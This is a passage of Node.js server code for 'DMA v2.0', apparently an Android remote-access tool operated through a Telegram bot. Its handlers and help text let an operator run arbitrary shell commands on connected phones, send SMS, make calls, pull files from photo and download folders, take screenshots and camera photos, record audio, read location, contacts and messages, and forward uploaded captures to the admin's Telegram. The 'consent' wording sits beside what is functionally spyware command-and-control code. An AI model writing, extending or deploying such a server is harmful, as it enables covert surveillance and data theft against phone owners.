        bot.sendMessage(chatId, 
            '❌ *Invalid phone number format*\n' +
            'Please enter a valid number (5-20 digits):',
            { parse_mode: 'Markdown' }
        ).catch(e => {});
        return;
    }
    
    setUserSession(chatId, { 
        state: 'awaiting_sms_message', 
        deviceId: session.deviceId,
        phoneNumber: phoneNumber
    });
    
    bot.sendMessage(chatId, 
        `💬 *Enter SMS message for ${phoneNumber}:*`,
        { parse_mode: 'Markdown' }
    ).catch(e => {});
}

// Handle SMS message input
function handleSmsMessage(chatId, text, session) {
    const message = text.trim();
    
    if (message.length === 0 || message.length > 1600) {
        bot.sendMessage(chatId, 
            '❌ *Invalid message*\n' +
            'Message must be 1-1600 characters:',
            { parse_mode: 'Markdown' }
        ).catch(e => {});
        return;
    }
    
    sendCommandToDevice(session.deviceId, 'send_sms', { 
        number: session.phoneNumber, 
        message: message 
    });
    
    bot.sendMessage(chatId, 
        `💬 *Sending SMS...*\n` +
        `To: ${session.phoneNumber}\n` +
        `Device: \`${session.deviceId.substring(0, 8)}...\``,
        { 
            parse_mode: 'Markdown',
            reply_markup: removeKeyboard.reply_markup 
        }
    ).catch(e => {});
    clearUserSession(chatId);
}

// Handle custom command input
function handleCustomCommand(chatId, text, session) {
    const command = text.trim();
    
    if (command.length === 0) {
        bot.sendMessage(chatId, 
            '❌ *Command cannot be empty*',
            { parse_mode: 'Markdown' }
        ).catch(e => {});
        return;
    }
    
    sendCommandToDevice(session.deviceId, 'execute', { cmd: command });
    bot.sendMessage(chatId, 
        `⚡ *Executing command...*\n` +
        `Device: \`${session.deviceId.substring(0, 8)}...\`\n` +
        `Command: \`${command}\``,
        { 
            parse_mode: 'Markdown',
            reply_markup: removeKeyboard.reply_markup 
        }
    ).catch(e => {});
    clearUserSession(chatId);
}

// Handle file path input
function handleFilePath(chatId, text, session) {
    const filePath = text.trim();
    
    if (filePath.length === 0) {
        bot.sendMessage(chatId, 
            '❌ *Path cannot be empty*',
            { parse_mode: 'Markdown' }
        ).catch(e => {});
        return;
    }
    
    if (filePath.startsWith('/')) {
        let path = filePath;
        let displayPath = filePath;
        
        if (filePath === '/list' || filePath === '/root') {
            path = '/';
            displayPath = 'Root Directory';
        } else if (filePath === '/downloads') {
            path = '/storage/emulated/0/Download';
            displayPath = 'Downloads';
        } else if (filePath === '/pictures') {
            path = '/storage/emulated/0/Pictures';
            displayPath = 'Pictures';
        } else if (filePath === '/dcim') {
            path = '/storage/emulated/0/DCIM';
            displayPath = 'DCIM';
        } else if (filePath === '/documents') {
            path = '/storage/emulated/0/Documents';
            displayPath = 'Documents';
        }
        
        sendCommandToDevice(session.deviceId, 'list_files', { path: path });
        bot.sendMessage(chatId, 
            `📁 *Listing ${displayPath}...*\n` +
            `Device: \`${session.deviceId.substring(0, 8)}...\``,
            { 
                parse_mode: 'Markdown',
                reply_markup: removeKeyboard.reply_markup 
            }
        ).catch(e => {});
    } else {
        setUserSession(chatId, { 
            state: 'file_selected', 
            deviceId: session.deviceId,
            filePath: filePath
        });
        
        bot.sendMessage(chatId, 
            `📁 *File selected:*\n\`${filePath}\`\n\n` +
            `*Choose action:*`,
            { 
                parse_mode: 'Markdown',
                reply_markup: fileActionsKeyboard.reply_markup 
            }
        ).catch(e => {});
    }
}

// Show help message
function showHelp(chatId) {
    const helpText = `
🤖 *DMA v2.0 - COMPLETE HELP GUIDE*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*📱 INTERACTIVE CONTROLS:*
• Use the keyboard buttons for quick actions
• Select devices from the list
• Follow prompts for inputs
• All actions are logged for transparency

*🔐 NEW - CONSENT MANAGEMENT:*
• /consents <device_id> - View current consent status
• /revoke <device_id> <type> - Revoke specific consent
• /revoke_all <device_id> - Revoke all consents
• /log <device_id> - View transparency log
• Consents can be revoked ANYTIME via settings

*📋 AVAILABLE COMMANDS:*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

*📱 DEVICE MANAGEMENT:*
/list - Show all connected devices
/info <device_id> - Get detailed device info
/settings - Device configuration

*📸 MEDIA CAPTURE:*
/screen <device_id> - Take screenshot
/camera <device_id> <front|rear> - Take photo
/record <device_id> <seconds> - Record audio

*📍 LOCATION & FILES:*
/location <device_id> - Get GPS location
/files <device_id> - Browse filesystem
/file <device_id> <path> - Download specific file

*📞 COMMUNICATION:*
/call <device_id> <number> - Make phone call
/sms <device_id> <number> <message> - Send SMS
/contacts <device_id> - Get contact list
/messages <device_id> - Get SMS messages

*📱 APPLICATIONS:*
/apps <device_id> - List installed apps

*🖥️ ADVANCED:*
/shell <device_id> <command> - Execute shell command
/cmd - Interactive command execution

*🔐 PRIVACY & SECURITY:*
/consents <device_id> - View consent status
/revoke <device_id> <type> - Revoke specific consent
/revoke_all <device_id> - Revoke all permissions
/log <device_id> - View transparency log

*❓ OTHER:*
/keyboard - Show interactive keyboard
/help - Show this help message
/start - Restart the bot

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*PRIVACY FIRST:* All consents can be revoked at any time
*TRANSPARENCY:* Every action is logged and auditable
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    `;
    
    bot.sendMessage(chatId, helpText, { 
        parse_mode: 'Markdown',
        reply_markup: mainKeyboard.reply_markup 
    }).catch(e => {});
}

// HTTP endpoints
app.post('/api/upload', upload.single('file'), (req, res) => {
    try {
        const deviceId = req.headers['device-id'];
        const fileType = req.headers['file-type'] || 'unknown';
        
        if (!deviceId) {
            return res.status(400).json({ error: 'Device ID required' });
        }
        
        if (!req.file) {
            return res.status(400).json({ error: 'No file uploaded' });
        }
        
        const fileSize = (req.file.size / 1024 / 1024).toFixed(2);
        const fileUrl = `${process.env.SERVER_URL || 'http://localhost:' + PORT}/${req.file.path}`;
        
        if (bot) {
            const caption = `📁 *FILE RECEIVED*\n━━━━━━━━━━━━━━━━━━━━━\n` +
                           `• Device: \`${deviceId.substring(0, 8)}...\`\n` +
                           `• Type: ${fileType}\n` +
                           `• Name: ${req.file.originalname}\n` +
                           `• Size: ${fileSize}MB\n` +
                           `━━━━━━━━━━━━━━━━━━━━━`;
            
            bot.sendDocument(adminId, req.file.path, { 
                caption,
                parse_mode: 'Markdown'
            }).then(() => {
                setTimeout(() => {
                    if (fs.existsSync(req.file.path)) {
                        fs.unlinkSync(req.file.path);
                        logEvent('FILE_CLEANUP', deviceId, `Deleted: ${req.file.path}`);
                    }
                }, 60000);
            }).catch(error => {
                console.error('Error sending file to Telegram:', error);
            });
        }
        
        res.json({ 
            success: true, 
            url: fileUrl,
            size: fileSize,
            type: fileType
        });
        
    } catch (error) {
        console.error('Upload error:', error);
        res.status(500).json({ error: 'Upload failed' });
    }
});

app.post('/api/getfile', (req, res) => {
    const { deviceId, filePath } = req.body;
    
    if (!deviceId || !filePath) {
        return res.status(400).json({ error: 'Missing parameters' });
    }
    
    const device = connectedDevices.get(deviceId);
    if (!device) {
        return res.status(404).json({ error: 'Device not connected' });
    }
    
    const cmdObj = {
        type: 'command',
        id: uuidv4(),
        command: 'get_file',
        data: { path: filePath },
        timestamp: Date.now()
    };
    
    device.ws.send(JSON.stringify(cmdObj));
    res.json({ success: true, message: 'File request sent' });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        connectedDevices: connectedDevices.size,
        uptime: process.uptime(),
        timestamp: new Date().toISOString(),
        version: '2.0.0'
    });
});

// Cleanup old sessions
setInterval(() => {
    const now = Date.now();
    userSessions.forEach((session, userId) => {
        if (now - session.timestamp > 15 * 60 * 1000) {
            userSessions.delete(userId);
        }
    });
}, 5 * 60 * 1000);

// Cleanup old files periodically
setInterval(() => {
    const now = Date.now();
    const maxAge = 24 * 60 * 60 * 1000;
    
    ['uploads', 'screenshots', 'recordings', 'photos'].forEach(dir => {
        if (fs.existsSync(dir)) {
            fs.readdirSync(dir).forEach(file => {
                const filePath = path.join(dir, file);
                try {
                    const stats = fs.statSync(filePath);
                    if (now - stats.mtimeMs > maxAge) {
                        fs.unlinkSync(filePath);
                        logEvent('FILE_CLEANUP', 'system', `Deleted old file: ${filePath}`);
                    }
                } catch (error) {
                    console.error('Cleanup error:', error);
                }
            });
        }
    });
}, 60 * 60 * 1000);

// Start server
const PORT = process.env.PORT || 8999;
server.listen(PORT, '0.0.0.0', async () => {
    console.log('\n\x1b[36m%s\x1b[0m', '🚀 ========================================');
    console.log('\x1b[36m%s\x1b[0m', '   DMA SERVER v2.0 - DEVICE MANAGEMENT APP   ');
    console.log('\x1b[36m%s\x1b[0m', '========================================\n');
    console.log(`📡 Server: \x1b[32mhttp://localhost:${PORT}\x1b[0m`);
    
    // Start bot with retry logic
    let retryCount = 0;
    const maxRetries = 3;
    
    while (retryCount < maxRetries) {
        try {
            bot = await startBot();
            if (bot) break;
        } catch (error) {
            retryCount++;
            console.log(`⚠️ Bot initialization attempt ${retryCount} failed, retrying...`);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
    
    if (bot) {
        console.log(`🤖 Bot: \x1b[32m@Device1deep_bot\x1b[0m`);
    } else {
        console.log(`🤖 Bot: \x1b[31mFAILED TO START\x1b[0m`);
        console.log(`   ⚠️  Check if another instance is running`);
        console.log(`   💡 Run: \x1b[33mkillall node\x1b[0m to stop all instances`);
    }
    
    console.log(`🔐 Admin ID: \x1b[33m${adminId}\x1b[0m`);
    console.log(`📊 Status: \x1b[32mRUNNING\x1b[0m`);
    console.log(`✨ Features: Commands | Files | Screenshots | Camera | Location | Audio | SMS | Calls | Apps | Shell`);
    console.log(`🆕 New: \x1b[33mConsent Management | Transparency Log | Remote Revoke\x1b[0m`);
    console.log('\n\x1b[36m%s\x1b[0m', '========================================\n');
    
    logEvent('SERVER_STARTED', 'system', `Port: ${PORT} | Version: 2.0.0 | Bot: ${bot ? 'OK' : 'Failed'}`);
});

// Handle graceful shutdown
process.on('SIGTERM', () => {
    console.log('\n\x1b[33mSIGTERM received. Shutting down gracefully...\x1b[0m');
    logEvent('SERVER_STOPPED', 'system', 'SIGTERM received');
    
    if (bot) {
        bot.stopPolling();
    }
    
    wss.close(() => {
        server.close(() => {
            console.log('\x1b[32mServer shutdown complete\x1b[0m');
            process.exit(0);
        });
    });
});

process.on('SIGINT', () => {
    console.log('\n\x1b[33mSIGINT received. Shutting down gracefully...\x1b[0m');
    logEvent('SERVER_STOPPED', 'system', 'SIGINT received');
    
    if (bot) {
        bot.stopPolling();
    }
    
    wss.close(() => {
        server.close(() => {
            console.log('\x1b[32mServer shutdown complete\x1b[0m');
            process.exit(0);
        });
    });
});

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
    console.error('\x1b[31mUncaught Exception:\x1b[0m', error);
    logEvent('UNCAUGHT_EXCEPTION', 'system', error.message);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('\x1b[31mUnhandled Rejection:\x1b[0m', reason);
    logEvent('UNHANDLED_REJECTION', 'system', reason);
});

module.exports = { app, server, wss, connectedDevices };
